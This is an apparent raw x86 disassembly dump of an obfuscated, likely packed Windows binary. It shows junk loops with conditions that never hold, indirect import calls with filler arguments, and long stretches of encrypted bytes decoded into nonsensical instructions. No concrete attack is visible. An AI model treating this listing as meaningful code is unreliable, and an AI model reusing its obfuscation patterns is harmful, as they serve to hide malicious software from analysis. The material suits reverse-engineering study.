  406b37:	call   DWORD PTR ds:0x42e85f
  406b3d:	xor    ecx,ecx
  406b3f:	xor    ecx,DWORD PTR ds:0x43035f
  406b45:	dec    ecx
  406b46:	mov    DWORD PTR ds:0x43035f,ecx
  406b4c:	jmp    0x406b1d
  406b51:	sub    DWORD PTR ds:0x4302b5,ebx
  406b57:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  406b5e:	mov    edx,DWORD PTR [ebp+0x8]
  406b61:	sbb    edi,edi
  406b63:	mov    DWORD PTR [ebp-0x40],eax
  406b66:	mov    eax,0x7510854
  406b6b:	and    DWORD PTR ds:0x430357,0x0
  406b75:	jmp    0x406b87
  406b7a:	mov    ecx,DWORD PTR ds:0x430357
  406b80:	inc    ecx
  406b81:	mov    DWORD PTR ds:0x430357,ecx
  406b87:	cmp    DWORD PTR ds:0x430357,0x11
  406b8e:	jae    0x406bc3
  406b94:	cmp    DWORD PTR ds:0x430357,0x1e
  406b9b:	jne    0x406bbe
  406ba1:	push   DWORD PTR [ebp-0x1c]
  406ba4:	push   0x42e666
  406ba9:	push   0x798e
  406bae:	push   0x8b33
  406bb3:	push   0x403f
  406bb8:	call   DWORD PTR ds:0x42e927
  406bbe:	jmp    0x406b7a
  406bc3:	xor    edx,eax
  406bc5:	xor    ecx,ecx
  406bc7:	xor    ecx,DWORD PTR ds:0x42e648
  406bcd:	add    DWORD PTR ds:0x4302bd,ecx
  406bd3:	mov    ecx,0x32729b
  406bd8:	movzx  edi,WORD PTR ds:0x42ec4b
  406bdf:	and    edi,DWORD PTR ds:0x430363
  406be5:	mov    DWORD PTR ds:0x42ec4b,edi
  406beb:	jmp    0x406d9c
  406bf0:	cld    
  406bf1:	ss aam 0xb
  406bf4:	je     0x406bdf
  406bf6:	inc    ecx
  406bf7:	mov    cl,0xca
  406bf9:	mov    ebp,0x66217504
  406bfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bff:	out    0x65,al
  406c01:	cmp    bh,BYTE PTR [esi+0x7e]
  406c04:	mov    bh,BYTE PTR [edi+0x7e]
  406c07:	jle    0x406bbe
  406c09:	xchg   edi,eax
  406c0a:	push   eax
  406c0b:	mov    bl,ch
  406c0d:	xor    dh,dh
  406c0f:	cld    
  406c10:	pushf  
  406c11:	sub    al,0x98
  406c13:	sub    eax,0x95003799
  406c18:	mov    ebx,esp
  406c1a:	push   eax
  406c1b:	sbb    esp,DWORD PTR [ebp+ebx*1+0x119febe0]
  406c22:	loop   0x406bf4
  406c24:	and    eax,0xab8febca
  406c29:	ins    BYTE PTR es:[edi],dx
  406c2a:	lds    edi,FWORD PTR gs:[ecx-0x68dc3e3]
  406c31:	in     eax,dx
  406c32:	into   
  406c33:	adc    DWORD PTR [esp+eiz*2+0x52],0x44
  406c38:	shl    DWORD PTR [edx],0xe9
  406c3b:	mov    esp,0x5715f8b7
  406c40:	cmp    DWORD PTR [edi-0x1c90bb20],ecx
  406c46:	gs nop
  406c48:	imul   dl
  406c4a:	inc    ecx
  406c4b:	add    DWORD PTR [edx+ebp*2-0x42f7b89],ecx
  406c52:	inc    eax
  406c53:	aad    0x6
  406c55:	pop    ss
  406c56:	ret    
  406c57:	lea    esi,[ebp+0x79]
  406c5a:	scas   al,BYTE PTR es:[edi]
  406c5b:	mov    al,0x13
  406c5d:	sbb    eax,0xc841206c
  406c62:	adc    eax,0x3bb66d26
  406c67:	in     eax,0x84
  406c69:	lods   al,BYTE PTR ds:[esi]
  406c6a:	fisttp DWORD PTR [eax]
  406c6c:	arpl   WORD PTR [edx+0x7a4c86bc],si
  406c72:	pop    es
  406c73:	sbb    ebp,0x14
  406c76:	int3   
  406c77:	call   0x296acb51
  406c7c:	xchg   ebx,eax
  406c7d:	sub    eax,0x2497bb8a
  406c82:	mov    ah,0x5e
  406c84:	cdq    
  406c85:	adc    BYTE PTR [esi-0x5a],0x2f
  406c89:	inc    esi
  406c8a:	push   ecx
  406c8b:	and    ah,BYTE PTR [edi-0x39]
  406c8e:	push   edi
  406c8f:	hlt    
  406c90:	inc    ebx
  406c91:	fwait
  406c92:	js     0x406cc0
  406c94:	mov    al,ds:0xe3fa8f64
  406c99:	xchg   edx,eax
  406c9a:	and    al,0xf8
  406c9c:	test   eax,0xc1697d35
  406ca1:	cli    
  406ca2:	mov    ch,0xc4
  406ca4:	lahf   
  406ca5:	sub    eax,0x6e3f8517
  406caa:	outs   dx,DWORD PTR ds:[esi]
  406cab:	mov    eax,esi
  406cad:	ins    DWORD PTR es:[edi],dx
  406cae:	hlt    
  406caf:	fnstcw WORD PTR [edi+eax*2-0x3442eeb3]
  406cb6:	fld    TBYTE PTR [edi]
  406cb8:	dec    esp
  406cb9:	xlat   BYTE PTR ds:[ebx]
  406cba:	clc    
  406cbb:	icebp  
  406cbc:	adc    eax,0xa3d142f5
  406cc1:	push   eax
  406cc2:	pop    ecx
  406cc3:	jne    0x406c6d
  406cc5:	dec    esi
  406cc6:	std    
  406cc7:	test   eax,0xb999d701
  406ccc:	push   esp
  406ccd:	pop    edi
  406cce:	xchg   edx,eax
  406ccf:	int3   
  406cd0:	add    al,0x43
  406cd2:	pop    edx
  406cd3:	fwait
  406cd4:	jge    0x406c71
  406cd6:	and    eax,0x1332ad6a
  406cdb:	arpl   WORD PTR [esi-0x6eb92b25],dx
  406ce1:	nop
  406ce2:	xchg   edx,eax
  406ce3:	jnp    0x406c69
  406ce5:	(bad)  
  406ce6:	jmp    0x3ca0:0x6050af37
  406ced:	push   ebx
  406cee:	mov    DWORD PTR [edx+0x33],edx
  406cf1:	syscall 
  406cf3:	outs   dx,BYTE PTR ds:[esi]
  406cf4:	adc    al,0x68
  406cf6:	jnp    0x406d49
  406cf8:	fs jo  0x406d3b
  406cfb:	adc    eax,0x57ba6132
  406d00:	sbb    eax,DWORD PTR [eax+0x4a]
  406d03:	ds jnp 0x406ce6
  406d06:	xchg   esi,eax
  406d07:	(bad)  
  406d08:	push   edx
  406d09:	sbb    bl,BYTE PTR [ebx]
  406d0b:	jmp    0x240:0x3d9589b0
  406d12:	pop    ds
  406d13:	jbe    0x406cd9
  406d15:	mov    eax,ds:0x7822ffe5
  406d1a:	jmp    0x406d94
  406d1c:	jne    0x406d18
  406d1e:	sub    DWORD PTR [edi+0x50],esi
  406d21:	push   ds
  406d22:	outs   dx,BYTE PTR ds:[esi]
  406d23:	inc    ebp
  406d24:	sbb    ah,BYTE PTR [ebx]
  406d26:	mov    bl,0x17
  406d28:	pop    esi
  406d29:	mov    ebx,0x4584ae6a
  406d2e:	or     DWORD PTR [edi+0x762425e7],eax
  406d34:	add    DWORD PTR [esi],eax
  406d36:	test   al,0xe3
  406d38:	jmp    0x406d10
  406d3a:	lahf   
  406d3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d3c:	leave  
  406d3d:	sahf   
  406d3e:	mov    dh,0xe5
  406d40:	imul   eax,edi,0x38
  406d43:	ins    DWORD PTR es:[edi],dx
  406d44:	shr    DWORD PTR [edx],cl
  406d46:	jmp    0x8cd99653
  406d4b:	daa    
  406d4c:	inc    eax
  406d4d:	std    
  406d4e:	xor    al,0x99
  406d50:	mov    ch,0x29
  406d52:	stos   BYTE PTR es:[edi],al
  406d53:	sbb    al,BYTE PTR [ebp-0x6875142d]
  406d59:	shr    DWORD PTR [edi-0x41],0xe3
  406d5d:	lods   eax,DWORD PTR ds:[esi]
  406d5e:	and    eax,0xff66689d
  406d63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d64:	(bad)  
  406d65:	sub    al,0xc3
  406d67:	cwde   
  406d68:	xchg   edi,eax
  406d69:	pop    eax
  406d6a:	inc    esp
  406d6b:	mov    edi,0x876e42c4
  406d70:	push   ecx
  406d71:	lock mov ebx,0xd810be23
  406d77:	xor    bl,BYTE PTR [ebx+0x40]
  406d7a:	je     0x406def
  406d7c:	mov    eax,ds:0x94b0deb1
  406d81:	test   al,0x5f
  406d83:	push   eax
  406d84:	mov    fs,WORD PTR [edi]
  406d86:	lahf   
  406d87:	push   cs
  406d88:	call   DWORD PTR [eax-0x50]
  406d8b:	cwde   
  406d8c:	add    dl,0x0
  406d8f:	loopne 0x406dd8
  406d91:	jmp    0x2f56:0x7553ad92
  406d98:	inc    edx
  406d99:	arpl   bp,bp
  406d9b:	cld    
  406d9c:	add    edx,ecx
  406d9e:	and    DWORD PTR ds:0x43035f,0x0
  406da8:	mov    edi,DWORD PTR ds:0x43035f
  406dae:	inc    edi
  406daf:	mov    DWORD PTR ds:0x43035f,edi
  406db5:	cmp    DWORD PTR ds:0x43035f,0xa
  406dbc:	jne    0x406dcb
  406dc2:	push   DWORD PTR [ebp-0x1c]
  406dc5:	call   DWORD PTR ds:0x42eaa3
  406dcb:	cmp    DWORD PTR ds:0x43035f,0x9
  406dd2:	jne    0x406de7
  406dd8:	xor    edi,edi
  406dda:	or     edi,DWORD PTR ds:0x43035f
  406de0:	inc    edi
  406de1:	mov    DWORD PTR ds:0x43035f,edi
  406de7:	cmp    DWORD PTR ds:0x43035f,0x19
  406dee:	jb     0x406da8
  406df4:	xor    DWORD PTR ds:0x42e640,edx
  406dfa:	jmp    0x406fab
  406dff:	xchg   BYTE PTR [ebx+0x34],bl
  406e02:	sahf   
  406e03:	icebp  
  406e04:	jno    0x406d9a
  406e06:	arpl   WORD PTR [ecx-0x6a477b7b],si
  406e0c:	dec    esp
  406e0d:	add    eax,DWORD PTR [ecx+esi*8+0x38]
  406e11:	jle    0x406e91
  406e13:	mov    bh,BYTE PTR [edi+0x7e]
  406e16:	jle    0x406d98
  406e18:	std    
  406e19:	inc    esp
  406e1a:	pop    eax
  406e1b:	aaa    
  406e1c:	mov    ds:0x166069a0,al
  406e21:	pop    es
  406e22:	jne    0x406e01
  406e24:	mov    bh,0x3b
  406e26:	ror    DWORD PTR [eax],1
  406e28:	outs   dx,DWORD PTR gs:[esi]
  406e2a:	mov    al,ds:0x385644fd
  406e2f:	xor    edx,DWORD PTR [ecx+0x23]
  406e32:	xor    edx,0x99c1c34e
  406e38:	cdq    
  406e39:	and    esi,esp
  406e3b:	push   ss
  406e3c:	mov    ebx,0xcad5c755
  406e41:	pop    edi
  406e42:	pop    ss
  406e43:	test   eax,0xcc9ebc6e
  406e48:	mov    ds:0x3bc4c80f,al
  406e4d:	adc    BYTE PTR [eax],ch
  406e4f:	fcomi  st,st(4)
  406e51:	enter  0xa62,0x7b
  406e55:	sti    
  406e56:	inc    esi
  406e57:	adc    al,0x25
  406e59:	mov    cs,WORD PTR [esi+0x1b]
  406e5c:	(bad)  
  406e5e:	sti    
  406e5f:	push   cs
  406e60:	cs mov bl,al
  406e63:	and    eax,0xe356532c
  406e68:	cli    
  406e69:	shl    al,0x6d
  406e6c:	ins    DWORD PTR es:[edi],dx
  406e6d:	add    DWORD PTR [esi+ebx*1-0xb0ac5c1],edi
  406e74:	cmp    eax,0xa0008e83
  406e79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e7a:	cmp    dl,BYTE PTR [edx]
  406e7c:	mov    esp,0xe2d0a84
  406e81:	lock jg 0x406e04
  406e84:	or     al,0xd0
  406e86:	or     BYTE PTR [ebx+0x40d64388],al
  406e8c:	data16 jg 0x406e74
  406e8f:	ja     0x406ebd
  406e91:	adc    al,0x2d
  406e93:	lods   al,BYTE PTR ds:[esi]
  406e94:	jp     0x406ee8
  406e96:	bnd jp 0x406ee7
  406e99:	jo     0x406ee6
  406e9b:	xor    DWORD PTR [edi-0x67885deb],esp
  406ea1:	mov    ecx,0x4df2e759
  406ea6:	fiadd  WORD PTR [ecx-0x35dbd389]
  406eac:	mov    ds,WORD PTR [esi-0x830be14]
  406eb2:	jae    0x406f19
  406eb4:	push   ss
  406eb5:	(bad)  
  406eb6:	(bad)  
  406eb7:	in     al,0xcf
  406eb9:	test   al,0x87
  406ebb:	out    0x0,eax
  406ebd:	popf   
  406ebe:	sbb    BYTE PTR [ecx],al
  406ec0:	out    0x62,al
  406ec2:	nop
  406ec3:	dec    edx
  406ec4:	dec    ecx
  406ec5:	repz dec ebx
  406ec8:	addr16 pop edx
  406eca:	stos   BYTE PTR es:[edi],al
  406ecb:	aad    0x17
  406ecd:	outs   dx,DWORD PTR ds:[esi]
  406ece:	cs popa 
  406ed0:	or     eax,0x9cd1cac2
  406ed5:	addr16 push 0x6b
  406ed8:	fcom   QWORD PTR ds:0x8776569
  406ede:	clc    
  406edf:	cmc    
  406ee0:	push   ds
  406ee1:	xor    BYTE PTR [ecx],ch
  406ee3:	sub    al,0x35
  406ee5:	pusha  
  406ee6:	add    BYTE PTR ds:0x66b542be,cl
  406eec:	fldcw  WORD PTR [ebx+0x72]
  406eef:	sub    al,al
  406ef1:	mov    eax,edx
  406ef3:	push   esi
  406ef4:	test   DWORD PTR [eax+0x62450c2c],edx
  406efa:	add    ebx,DWORD PTR [ebp-0x45367768]
  406f00:	jecxz  0x406f2d
  406f02:	or     BYTE PTR [ecx-0x1a],0x5f
  406f06:	fisub  WORD PTR [esi+0x7a83ea8]
  406f0d:	xchg   edi,eax
  406f0e:	xchg   ebx,eax
  406f0f:	sub    DWORD PTR [ebp+0x73],edx
  406f12:	test   BYTE PTR [edx-0x34],cl
  406f15:	scas   eax,DWORD PTR es:[edi]
  406f16:	mov    ebp,DWORD PTR [ebx+0x2c]
  406f19:	fistp  QWORD PTR [edx+0x54]
  406f1c:	fdivr  QWORD PTR [esi]
  406f1e:	pop    es
  406f1f:	jns    0x406f33
  406f21:	aam    0xe3
  406f23:	call   0x3191:0x32714b61
  406f2a:	popf   
  406f2b:	je     0x406f72
  406f2d:	mov    BYTE PTR [edi-0x57ce6f6a],bl
  406f33:	aaa    
  406f34:	inc    edi
  406f35:	scas   eax,DWORD PTR es:[edi]
  406f36:	std    
  406f37:	sub    edx,0x18
  406f3a:	and    al,0x77
  406f3c:	or     eax,0xdf602dcb
  406f41:	jno    0x406ece
  406f43:	lahf   
  406f44:	repz mov esp,0xd2a9fb6e
  406f4a:	adc    al,0x19
  406f4c:	dec    ebp
  406f4d:	and    al,BYTE PTR [edx+0x49]
  406f50:	jl     0x406f57
  406f52:	xlat   BYTE PTR ds:[ebx]
  406f53:	lods   eax,DWORD PTR ds:[esi]
  406f54:	leave  
  406f55:	push   eax
  406f56:	std    
  406f57:	sub    ebx,esi
  406f59:	fnstenv [edi+eiz*1-0x44b6114b]
  406f60:	jns    0x406eee
  406f62:	xchg   ecx,eax
  406f63:	(bad)  
  406f64:	xor    al,0xfd
  406f66:	test   DWORD PTR [esi-0x242d00f2],edi
  406f6c:	in     eax,0x4e
  406f6e:	cmp    BYTE PTR [edx],bh
  406f70:	cmp    ch,BYTE PTR [ebp-0x1a]
  406f73:	push   esi
  406f74:	ss inc ecx
  406f76:	add    ecx,eax
  406f78:	xchg   ecx,eax
  406f79:	repnz mov eax,0x1236f156
  406f7f:	xor    eax,0xd310c246
  406f84:	pop    ds
  406f85:	sbb    dh,ah
  406f87:	pop    esp
  406f88:	sbb    al,0xba
  406f8a:	and    cl,BYTE PTR [ebx]
  406f8c:	xor    DWORD PTR [edx],0x32
  406f8f:	mov    bl,0xed
  406f91:	jnp    0x406f67
  406f93:	sub    eax,0x8d54bf42
  406f98:	loop   0x406ff4
  406f9a:	jno    0x406f89
  406f9c:	pop    ds
  406f9d:	xchg   ecx,eax
  406f9e:	xchg   esi,eax
  406f9f:	mul    ah
  406fa1:	cmp    esi,DWORD PTR [ebp+eax*4-0x59]
  406fa5:	mov    WORD PTR [ebx-0x77e5afdb],?
  406fab:	mov    DWORD PTR [ebp-0x8],edx
  406fae:	mov    edx,DWORD PTR [ebp+0x8]
  406fb1:	xor    edi,DWORD PTR ds:0x4302e5
  406fb7:	xor    edx,eax
  406fb9:	add    edx,ecx
  406fbb:	xor    DWORD PTR ds:0x4302c5,edi
  406fc1:	jmp    0x407172
  406fc6:	sub    DWORD PTR [ebx],ecx
  406fc8:	fnstsw WORD PTR [esi]
  406fca:	fucomp st(0)
  406fcc:	sub    ecx,ebp
  406fce:	cmp    DWORD PTR ds:0x472a3d82,edx
  406fd4:	sub    DWORD PTR [ebx],0xd
  406fd7:	(bad)  
  406fd8:	jle    0x407058
  406fda:	mov    bh,BYTE PTR [edi+0x7e]
  406fdd:	jle    0x406f91
  406fdf:	push   edi
  406fe0:	int3   
  406fe1:	jbe    0x40702d
  406fe3:	rcl    esp,1
  406fe5:	jl     0x406f8a
  406fe7:	fwait
  406fe8:	jle    0x406fce
  406fea:	leave  
  406feb:	ror    DWORD PTR [ebp+0x66],cl
  406fee:	retf   
  406fef:	add    bl,BYTE PTR [ebx+0x1e07b440]
  406ff5:	(bad)  
  406ff6:	push   ds
  406ff7:	or     al,0x78
  406ff9:	pop    ebp
  406ffa:	inc    esi
  406ffb:	inc    eax
  406ffc:	mov    eax,0xcce50b1a
  407001:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407002:	mov    eax,ds:0x6e68105
  407007:	pop    ebp
  407008:	mov    edi,0x7ff447c2
  40700d:	cwde   
  40700e:	ins    BYTE PTR es:[edi],dx
  40700f:	mov    bl,BYTE PTR [edi-0x33]
  407012:	cmp    BYTE PTR [esi],cl
  407014:	imul   esp,ebx,0xffffffa2
  407017:	std    
  407018:	in     al,0xcc
  40701a:	pop    ebp
  40701b:	repz cmp DWORD PTR [ecx],eax
  40701e:	or     DWORD PTR [ebp+0x13551482],esp
  407024:	jmp    0x5fb3:0x1f063859
  40702b:	pop    ss
  40702c:	add    eax,0xd0f59bee
  407031:	retf   0xba8d
  407034:	mov    esi,0xb85ebc10
  407039:	mov    edx,0xb77b01c6
  40703e:	addr16 sbb bl,bh
  407041:	dec    ecx
  407042:	ss rep ins DWORD PTR es:[edi],dx
  407045:	push   ecx
  407046:	mov    edx,0x417226c4
  40704b:	dec    esp
  40704c:	pop    ss
  40704d:	shr    DWORD PTR [ebx],0x3
  407050:	jb     0x407042
  407052:	jmp    0xdd17:0x9efe1476
  407059:	les    esi,FWORD PTR [edi]
  40705b:	pop    ebx
  40705c:	fisub  WORD PTR [ebx+0x68]
  40705f:	push   edi
  407060:	enter  0x782,0x50
  407064:	gs in  eax,dx
  407066:	iret   
  407067:	or     ecx,esp
  407069:	sub    cl,al
  40706b:	mov    dl,0x52
  40706d:	sbb    eax,0x27f9d799
  407072:	imul   edx,DWORD PTR [edi+0x2cb589ab],0xf
  407079:	enter  0xaec8,0xf7
  40707d:	dec    esi
  40707e:	jo     0x4070b9
  407080:	popf   
  407081:	jne    0x407032
  407083:	inc    edi
  407084:	jmp    0x91c98541
  407089:	nop
  40708a:	mov    eax,0xae43451a
  40708f:	pop    ds
  407090:	jmp    0x4070b6
  407092:	mov    dh,0x76
  407094:	pop    es
  407095:	sbb    BYTE PTR [ebx-0x7a8134a1],dl
  40709b:	mov    bh,0x89
  40709d:	mov    bh,0x1b
  40709f:	push   ds
  4070a0:	adc    eax,0x4dbb040d
  4070a5:	xor    BYTE PTR [eax],bh
  4070a7:	jae    0x407055
  4070a9:	lahf   
  4070aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070ab:	jg     0x40710f
  4070ad:	out    0x6f,al
  4070af:	in     eax,dx
  4070b0:	(bad)  [ebx-0x385d2c83]
  4070b6:	inc    edx
  4070b7:	xor    al,0xda
  4070b9:	icebp  
  4070ba:	and    ebx,DWORD PTR [eax+0x7bc1c19e]
  4070c0:	cmp    ah,BYTE PTR ds:0x50a22287
  4070c6:	push   ss
  4070c7:	cli    
  4070c8:	int    0xff
  4070ca:	cmp    dl,al
  4070cc:	outs   dx,DWORD PTR ds:[esi]
  4070cd:	sti    
  4070ce:	cmp    cl,al
  4070d0:	(bad)  
  4070d1:	shl    BYTE PTR [ebp-0xf],cl
  4070d4:	pushf  
  4070d5:	pop    esi
  4070d6:	xor    ecx,esi
  4070d8:	push   ebp
  4070d9:	dec    esp
  4070da:	xchg   esi,eax
  4070db:	in     eax,0x36
  4070dd:	adc    ah,0xf0
  4070e0:	sub    DWORD PTR [si+0x220c],esp
  4070e5:	jecxz  0x407082
  4070e7:	jle    0x407121
  4070e9:	(bad)  
  4070ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070eb:	pop    esi
  4070ec:	xor    edi,ebx
  4070ee:	mov    bh,0xf7
  4070f0:	out    0xf4,al
  4070f2:	mov    BYTE PTR [ecx-0x571fdeb2],cl
  4070f8:	push   eax
  4070f9:	hlt    
  4070fa:	jg     0x4070ea
  4070fc:	push   ebp
  4070fd:	inc    ebx
  4070fe:	data16 mov WORD PTR ds:0x2bf7872,?
  407105:	xchg   ebp,eax
  407106:	or     al,0xdc
  407108:	mov    ?,WORD PTR [esi]
  40710a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40710b:	xor    eax,0xa736d67e
  407110:	xor    al,0xbe
  407112:	and    DWORD PTR [ebx+0x72],ebp
  407115:	sbb    BYTE PTR [edx+0x7ed449a4],dl
  40711b:	add    ecx,DWORD PTR [eax+0x3f2d28ad]
  407121:	sub    eax,0xb987b5d9
  407126:	add    eax,0x7961e404
  40712b:	bound  esp,QWORD PTR [ecx-0x29]
  40712e:	mov    al,ds:0xb7a6a42d
  407133:	or     eax,0x49331c76
  407138:	sub    eax,0xbcf777ad
  40713d:	retf   0x401b
  407140:	or     bh,BYTE PTR [esi-0x44]
  407143:	jmp    0xbea7:0x4bb55fc9
  40714a:	ss mov dh,0x92
  40714d:	add    eax,0x1f490903
  407152:	push   0xffffff83
  407154:	mov    dl,0xb6
  407156:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407157:	xor    DWORD PTR [esi-0x62423e60],edi
  40715d:	das    
  40715e:	pop    ecx
  40715f:	add    al,0x4e
  407161:	push   ss
  407162:	std    
  407163:	cmp    BYTE PTR ds:0x670d90f,dh
  407169:	daa    
  40716a:	inc    edi
  40716b:	pop    edx
  40716c:	inc    ebp
  40716d:	aad    0x15
  40716f:	cmp    DWORD PTR [ecx+0xc558933],0xe6402581
  407179:	inc    edx
  40717a:	add    BYTE PTR [eax],al
  40717c:	add    BYTE PTR [eax],al
  40717e:	add    cl,ch
  407180:	or     eax,0x8b000000
  407185:	cmp    eax,0x42e640
  40718a:	inc    edi
  40718b:	mov    DWORD PTR ds:0x42e640,edi
  407191:	cmp    DWORD PTR ds:0x42e640,0x1a
  407198:	jae    0x4071c1
  40719e:	cmp    DWORD PTR ds:0x42e640,0x28
  4071a5:	jne    0x4071b6
  4071ab:	push   0x716b
  4071b0:	call   DWORD PTR ds:0x42e92b
  4071b6:	jmp    0x407184
  4071bb:	and    DWORD PTR ds:0x4302e9,edi
  4071c1:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  4071c8:	adc    edi,DWORD PTR ds:0x4302cd
  4071ce:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  4071d5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4071dc:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4071e3:	and    DWORD PTR ds:0x4302e1,0x0
  4071ed:	mov    edi,DWORD PTR ds:0x4302e1
  4071f3:	inc    edi
  4071f4:	mov    DWORD PTR ds:0x4302e1,edi
  4071fa:	cmp    DWORD PTR ds:0x4302e1,0x6
  407201:	jne    0x407247
  407207:	push   0x42e7a9
  40720c:	push   DWORD PTR [ebp-0x14]
  40720f:	push   0x2c1e
  407214:	push   0x5ddb
  407219:	push   DWORD PTR [ebp-0x20]
  40721c:	push   0x67ee
  407221:	push   DWORD PTR [ebp-0x18]
  407224:	push   DWORD PTR [ebp-0x24]
  407227:	push   DWORD PTR [ebp-0x14]
  40722a:	push   0x21a8
  40722f:	push   0x81f6
  407234:	push   0x1b91
  407239:	push   0x8bde
  40723e:	push   DWORD PTR [ebp-0x28]
  407241:	call   DWORD PTR ds:0x42e92f
  407247:	cmp    DWORD PTR ds:0x4302e1,0x5
  40724e:	jne    0x407261
  407254:	mov    edi,DWORD PTR ds:0x4302e1
  40725a:	inc    edi
  40725b:	mov    DWORD PTR ds:0x4302e1,edi
  407261:	cmp    DWORD PTR ds:0x4302e1,0x12
  407268:	jb     0x4071ed
  40726e:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  407275:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40727c:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  407283:	mov    edx,DWORD PTR [ebp+0x8]
  407286:	xor    edi,edi
  407288:	add    edi,DWORD PTR ds:0x42e63c
  40728e:	or     DWORD PTR ds:0x4302e5,edi
  407294:	jmp    0x407445
  407299:	mov    edx,0xad140ee9
  40729e:	icebp  
  40729f:	inc    eax
  4072a0:	jno    0x4072e6
  4072a2:	mov    eax,ds:0x660b3f15
  4072a7:	add    DWORD PTR [edx+0x7e7ec799],esp
  4072ad:	mov    bh,BYTE PTR [edi+0x7e]
  4072b0:	jle    0x407286
  4072b2:	(bad)  
  4072b3:	xlat   BYTE PTR ds:[ebx]
  4072b4:	ret    
  4072b5:	jns    0x4072ed
  4072b7:	call   0xc97c:0x2fd2594
  4072be:	stos   DWORD PTR es:[edi],eax
  4072bf:	mov    ah,0xc
  4072c1:	mov    cl,0x79
  4072c3:	scas   al,BYTE PTR es:[edi]
  4072c4:	push   edx
  4072c5:	mov    ds:0x31e2de24,al
  4072ca:	dec    edx
  4072cb:	shr    BYTE PTR [esi+0x22d15998],1
  4072d1:	lds    ecx,FWORD PTR [edx]
  4072d3:	xchg   esi,eax
  4072d4:	mov    edx,0x4bb278ca
  4072d9:	adc    esi,DWORD PTR [ebp+0x2f]
  4072dc:	pop    ss
  4072dd:	adc    al,0xd4
  4072df:	or     al,0xc1
  4072e2:	mov    ds:0x263e00a3,al
  4072e7:	dec    edi
  4072e8:	mov    ah,0xcf
  4072ea:	or     esi,DWORD PTR [edi+0x39070fc9]
  4072f0:	mov    bl,0x23
  4072f2:	xchg   edx,ecx
  4072f4:	jl     0x4072e4
  4072f6:	and    BYTE PTR cs:[ecx],0xca
  4072fa:	cmp    dl,BYTE PTR [eax]
  4072fc:	cmp    al,0xac
  4072fe:	sti    
  4072ff:	std    
  407300:	xor    cl,dh
  407302:	mov    ebp,DWORD PTR [ecx+0x6ce21e9b]
  407308:	inc    ecx
  407309:	inc    esi
  40730a:	xchg   esp,eax
  40730b:	mov    esi,0xe9b2be44
  407310:	jmp    0x407355
  407312:	mov    ecx,0x9b0b6d78
  407317:	stos   DWORD PTR es:[edi],eax
  407318:	push   0x889a692b
  40731d:	sbb    DWORD PTR [esi],edx
  40731f:	adc    DWORD PTR [eax+ecx*4-0x15605037],edi
  407326:	(bad)  
  407327:	in     al,dx
  407328:	stos   DWORD PTR es:[edi],eax
  407329:	inc    ebx
  40732a:	adc    esp,ebp
  40732c:	(bad)  
  40732d:	mul    DWORD PTR [eax+esi*1-0x8]
  407331:	fidivr DWORD PTR [esi+0x1ebfc0f5]
  407337:	xchg   DWORD PTR [ebx],eax
  407339:	mov    ebp,0xdf7ab3ef
  40733e:	mov    ds:0xeb5561a,al
  407343:	sub    BYTE PTR [eax+ecx*2+0x6b],bh
  407347:	sub    DWORD PTR [ecx-0x11b03c1e],esi
  40734d:	or     eax,0x4a0a5914
  407352:	pusha  
  407353:	inc    ebx
  407354:	mov    dh,0x5
  407356:	xchg   ecx,eax
  407357:	cli    
  407358:	je     0x40734f
  40735a:	test   eax,0x30e04980
  40735f:	cmp    ebp,DWORD PTR ds:0x9b44394c
  407365:	fstp   TBYTE PTR ds:0x3c691d9e
  40736b:	cmp    eax,0x688b953e
  407370:	test   al,0x28
  407372:	xor    BYTE PTR [esi],ch
  407374:	out    0x56,al
  407376:	shl    bh,1
  407378:	dec    ecx
  407379:	jg     0x4073bf
  40737b:	adc    al,0x5f
  40737d:	aaa    
  40737e:	xor    eax,0xcf63212
  407383:	mov    al,ds:0x9b4aca9c
  407388:	dec    ebp
  407389:	mov    eax,ds:0xf2142143
  40738e:	inc    edx
  40738f:	ins    DWORD PTR es:[edi],dx
  407390:	ffreep st(0)
  407392:	push   0x9f17b630
  407397:	mov    ebp,0xdbae3b81
  40739c:	addr16 fsubr st(3),st
  40739f:	mov    ebp,0x7638bfd5
  4073a4:	xor    dl,BYTE PTR [ecx]
  4073a6:	dec    eax
  4073a7:	(bad)  
  4073a8:	in     al,dx
  4073a9:	imul   esp,edi,0xffffffc1
  4073ac:	jle    0x407342
  4073ae:	mov    ah,0xb0
  4073b0:	arpl   WORD PTR [edi+0x5a],ax
  4073b3:	in     al,dx
  4073b4:	inc    edi
  4073b5:	sub    al,0x9
  4073b7:	in     eax,0xd4
  4073b9:	es cmc 
  4073bb:	test   eax,0xb58d36fc
  4073c0:	push   es
  4073c1:	add    eax,0x84f85f01
  4073c6:	(bad)  
  4073c7:	repz xor BYTE PTR [eax-0x552be6e],bh
  4073ce:	and    edi,DWORD PTR [eax+0x7e]
  4073d1:	leave  
  4073d2:	adc    eax,0xdad3d154
  4073d7:	(bad)  
  4073d8:	repz sbb BYTE PTR [ecx+ecx*4-0x560df1b7],ah
  4073e0:	sub    bh,0x81
  4073e3:	shl    esp,0x96
  4073e6:	sub    bl,bh
  4073e8:	sbb    dh,BYTE PTR [edi]
  4073ea:	pusha  
  4073eb:	or     ah,BYTE PTR [edx+0x7a]
  4073ee:	outs   dx,BYTE PTR ds:[esi]
  4073ef:	int    0x22
  4073f1:	ins    BYTE PTR es:[edi],dx
  4073f2:	fwait
  4073f3:	add    bl,bl
  4073f5:	leave  
  4073f6:	push   cs
  4073f7:	out    0x8,eax
  4073f9:	cwde   
  4073fa:	dec    edi
  4073fb:	cld    
  4073fc:	mov    dh,0x24
  4073fe:	int    0x89
